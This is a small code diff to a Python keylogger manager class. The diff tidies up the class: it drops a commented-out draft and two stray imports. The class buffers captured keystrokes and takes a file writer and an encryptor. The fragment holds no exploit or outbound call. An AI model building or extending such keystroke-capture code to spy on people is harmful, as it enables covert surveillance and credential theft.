@@ -1,11 +1,3 @@
-
-# class KeyLoggerManager:
-#     def __init__(self,KeyLoggerservice,FileWriter):
-#         self.KeyLoggerservice=KeyLoggerservice
-#         self.FileWriter=FileWriter
-#
-#     def buffer(self):
-#         return self.KeyLoggerservice+self.FileWriter
 class KeyLoggerManager:
     def __init__(self, keylogger_service, file_writer, encryptor, interval=5):
         self.keylogger_service = keylogger_service
@@ -20,8 +12,6 @@ class KeyLoggerManager:
             self.buffer.extend(keys)
             self.keylogger_service.clear_logged_keys()  # פונקציה אופציונלית שתאפס את הלוג
 
-    import threading
-    import time
 
     def start(self):
         self.running = True
